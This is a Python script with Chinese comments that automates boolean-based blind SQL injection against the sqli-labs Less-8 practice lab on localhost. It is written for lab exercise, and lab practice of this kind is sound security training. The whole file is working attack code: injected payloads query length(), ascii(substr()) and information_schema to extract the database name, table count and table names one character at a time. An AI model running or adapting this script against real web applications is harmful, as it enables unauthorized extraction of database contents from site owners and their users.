import requests
 
s = requests.session()
url = "http://127.0.0.1/sqli-labs-master/Less-8/?id=1"
#payloads = 'qwertyuioplkjhgfdsazxcvbnm1234567890'(数字和字符比较时字符会转成0吧，用ascii吧)
#headers={'cookie':''}
#爆数据库名长度
for l in range(1,30):
    databaselen_payload = "' and length(database())="+str(l)+"%23"
    if "You are in..........." in s.get(url+databaselen_payload).text:
        databaselen=l
        break
print("database_length:"+str(databaselen))
#爆数据库名
database_name=''
for l in range(1,databaselen+1):
    for i in range(1,128):
#    for i in payloads:
        database_payload = "' and ascii(substr(database(),"+str(l)+",1))="+str(i)+"%23"
        if "You are in" in s.get(url+database_payload).text:
            database_name = database_name + chr(i)
            break
print("database_name:",database_name)
#爆表个数
for l in range(1,50):
    tableNumber_payload = "' and (select count(table_name) from information_schema.tables where table_schema=database())="+str(l)+"%23"
    if "You are in" in s.get(url+tableNumber_payload).text:
        tableNumber = l
        break
print("tableNumber:",tableNumber)
#爆表名
#先爆表名长度
for l in range(0,tableNumber):#第几个表
    table_name = ''
    for i in range(1,50):#爆破表名长度
        tableLen_payload = "' and length(substr((select table_name from information_schema.tables where table_schema=database() limit "+str(l)+",1),1))="+str(i)+"%23"
        if "You are in" in s.get(url+tableLen_payload).text:
            tableLen = i
            break
    print("table"+str(l+1)+":",tableLen)
#爆表名
    for m in range(0,tableLen+1):
        for n in range(1,128):
            tableName_payload = "' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit "+str(l)+",1),"+str(m)+",1))="+str(n)+"%23"
            if "You are in" in s.get(url+tableName_payload).text:
                table_name = table_name + chr(n)
                break
    print("tableName"+str(l+1)+":"+table_name)